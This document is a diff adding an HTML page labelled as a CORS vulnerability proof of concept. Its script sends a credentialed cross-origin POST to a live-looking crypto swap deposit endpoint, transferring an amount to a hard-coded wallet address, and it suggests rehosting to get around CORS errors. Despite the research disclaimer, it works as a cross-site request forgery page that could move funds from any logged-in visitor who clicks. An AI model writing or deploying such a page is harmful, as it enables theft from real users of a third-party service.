@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Research PoC - CORS Test</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+            color: #333;
+        }
+        #status {
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .pending { background: #FFF3CD; color: #856404; }
+        .success { background: #D4EDDA; color: #155724; }
+        .error { background: #F8D7DA; color: #721C24; }
+        pre {
+            background: #F8F9FA;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        button {
+            background: #007BFF;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover { background: #0069D9; }
+    </style>
+</head>
+<body>
+    <h1>CORS Vulnerability PoC</h1>
+    <p>This page tests for CORS misconfigurations on the target API endpoint.</p>
+    
+    <div id="status" class="pending">Click "Test Exploit" to begin</div>
+    
+    <button id="exploitBtn">Test Exploit</button>
+    
+    <h3>Request Details:</h3>
+    <pre id="requestDetails">Not yet executed</pre>
+    
+    <h3>Response:</h3>
+    <pre id="responseDetails">Awaiting response...</pre>
+
+    <script>
+        document.getElementById('exploitBtn').addEventListener('click', async () => {
+            const statusEl = document.getElementById('status');
+            const requestEl = document.getElementById('requestDetails');
+            const responseEl = document.getElementById('responseDetails');
+            
+            // Target API (update this to the vulnerable endpoint)
+            const targetUrl = 'https://swap.pump.fun/deposit';
+            const testPayload = {
+                amount: 100,
+                to: 'HXSPRDbxoLpsFHEg4xWetcqDRQFK2pPW1f4tkfMsJAAR' // Replace with test wallet
+            };
+            
+            // Update UI
+            statusEl.className = 'pending';
+            statusEl.textContent = 'Executing test request...';
+            requestEl.textContent = `POST ${targetUrl}\n\n${JSON.stringify(testPayload, null, 2)}`;
+            
+            try {
+                // Execute the test request
+                const startTime = Date.now();
+                const response = await fetch(targetUrl, {
+                    method: 'POST',
+                    credentials: 'include', // Send cookies
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Test-Header': 'SecurityResearchPoC'
+                    },
+                    body: JSON.stringify(testPayload)
+                });
+                
+                const responseTime = Date.now() - startTime;
+                const responseData = await response.json();
+                
+                // Success state
+                statusEl.className = 'success';
+                statusEl.textContent = `✓ Exploit successful (${response.status} in ${responseTime}ms)`;
+                responseEl.textContent = `${JSON.stringify(responseData, null, 2)}\n\nHeaders:\n${[...response.headers].map(([k,v]) => `${k}: ${v}`).join('\n')}`;
+                
+                // Highlight CORS headers
+                if (response.headers.has('Access-Control-Allow-Origin')) {
+                    responseEl.innerHTML += '\n\n<span style="color:red">VULNERABLE: CORS header allows cross-origin requests</span>';
+                }
+                
+            } catch (error) {
+                // Error state
+                statusEl.className = 'error';
+                statusEl.textContent = `✗ Exploit failed: ${error.message}`;
+                responseEl.textContent = `${error.stack || error.toString()}`;
+                
+                // Special handling for CORS errors
+                if (error.message.includes('CORS')) {
+                    responseEl.innerHTML += '\n\n<strong>Note:</strong> The server may have CORS protections. Try these workarounds:\n1. Test from a different origin (Netlify/Glitch)\n2. Check for missing credentials';
+                }
+            }
+        });
+    </script>
+    
+    <footer style="margin-top: 40px; font-size: 0.8em; color: #666;">
+        <p>For security research purposes only. Never test on production systems without authorization.</p>
+    </footer>
+</body>
+</html>
